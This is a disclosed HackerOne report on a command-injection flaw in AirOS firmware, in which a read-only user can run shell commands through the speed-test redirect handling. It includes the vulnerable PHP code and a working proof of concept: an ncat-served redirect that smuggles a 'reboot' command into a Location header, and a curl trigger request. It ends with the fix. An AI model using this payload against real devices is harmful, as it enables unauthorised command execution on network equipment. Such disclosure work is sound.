---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '139398'
original_report_id: '139398'
title: Read-Only user can execute arbitraty shell commands on AirOS
weakness: Command Injection - Generic
team_handle: ui
created_at: '2016-05-17T17:47:16.026Z'
disclosed_at: '2016-08-05T09:36:57.491Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 43
tags:
- hackerone
- command-injection-generic
---

# Read-Only user can execute arbitraty shell commands on AirOS

## Metadata

- HackerOne Report ID: 139398
- Weakness: Command Injection - Generic
- Program: ui
- Disclosed At: 2016-08-05T09:36:57.491Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

This vulnerability is very similar to #128750, but it avoid the solution applied to the last beta XM firmware.

In this report is used the last beta XM firmware: `XM.v6.0-beta9`

# Vulnerability
The vulnerability resides in the function `fetchCookies` file `remote.inc:117`. Just like last time is a non sanitization or verification of the server (remote) response.

```
		if ($res == -11) { #received the redirect
			# got redirect, will have to try new one (if that's login.cgi)
			$lcount = count($lines);
			if ($lcount > 0) {
				$new_url = $lines[$lcount - 1]; # the URL returned by the attacker have shell code injected
			}
			$rg_login = "(https?://$ip(:[[:digit:]]+)?)/login.cgi"; #regex don't property verify the URL, it allow string before and after the URL
			if (IsSet($new_url) && ereg($rg_login, $new_url, $regs)) {
				$retry = 1;
				$base_url = $regs[1];
				$url = $new_url; # URL with shell code is utilized
			}
		}
		#[[REMOVED CODE]]

		if ($retry != 0) {
			$full_cmd = "$cmd_trigger -p $url"; # URL with shell code is injected
			exec($full_cmd, $lines, $res); # shell code executed
			$res = getRetVal($res);
		}

		}
```

# Proof-of-concept
First we (attacker) need to initialize a local server to make the redirect to the victim, in this example the attacker ip is `192.168.1.100`:
```
echo -en "HTTP/1.1 302 Found\r\nLocation: https://192.168.1.100/login.cgi `reboot`\r\nContent-Length: 0\r\n\r\n" | ncat -lp 8080
```

So you need to run a speed test against the attacker host, with can be done using the Web interface `https://192.168.1.20/sptest.cgi`, or by the following command (making the required adjusts):
```
curl 'https://192.168.1.20/sptest_action.cgi?ticket=507&action=remote&target=192.168.1.100&port=8080&login=ignore&passwd=ignore&airosid=96ba18a3aa55ba4c6e1f8ab111a9fb8f&_=1463505340471' -H 'Cookie: AIROS_001122334455=96ba18a3aa55ba4c6e1f8ab111a9fb8f; ui_language=en_US; last_check=1463504970136' 
```

# Possible Solution
This bug can be solved using literally 2 character, the REGEX end `$` and begin `^`:
```
$rg_login = "^(https?://$ip(:[[:digit:]]+)?)/login.cgi$";
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
